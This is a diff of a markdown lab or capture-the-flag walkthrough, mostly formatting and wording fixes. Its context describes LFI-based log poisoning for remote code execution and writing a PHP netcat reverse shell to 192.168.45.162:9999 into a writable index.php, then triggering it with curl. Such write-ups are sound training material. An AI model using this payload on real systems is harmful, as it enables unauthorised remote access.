@@ -100,7 +100,7 @@ Nmap done: 1 IP address (1 host up) scanned in 103.34 seconds
 
 ## Web enumeration
 
-Further enumeration of the open ports reveals something interesting on the HTTP server running on port 8593.
+Further enumeration reveals something interesting with the HTTP server running on port 8593.
 
 On the main page we see:
 
@@ -122,7 +122,7 @@ Armed with this knowledge we can begin our attack.
 
 With the ability to read arbitrary files through a php enabled web server we can conduct a **log poisoning attack** to achieve **remote code execution** and gain a foothold on the box.
 
-Our earlier nmap scan showed an apache web server running on port 80.  We can insert a PHP code snippet into `apache.log`by sending a request to the server with a modified user-agent header.  We can then trigger execution of this snippet on the server through our previously discovered LFI vulnerability.
+Our earlier nmap scan showed an apache web server running on port 80.  We can insert a PHP code snippet into `apache.log` by sending a request to the server with a modified user-agent header.  We can then trigger execution of this snippet on the server through our previously discovered LFI vulnerability.
 
 First we confirm our ability to access apache.log via LFI.
 
@@ -215,6 +215,7 @@ A look in `/var/tmp/sv` reveals an `index.php` page with write permissions.
 We can replace the contents of this file with another reverse shell PHP snippet and execute it with curl.
 
 First we insert the snippet and check the contents of `index.php`.
+
 ```
 echo "<?php system('nc 192.168.45.162 9999 -e /bin/bash')?>" > /var/tmp/sv/index.php
 ```
@@ -227,6 +228,7 @@ nc -lvnp 9999
 ```
 
 Then we run our `curl` command on the target machine to execute the code.
+
 ```
 curl 127.0.0.1:57
 ```
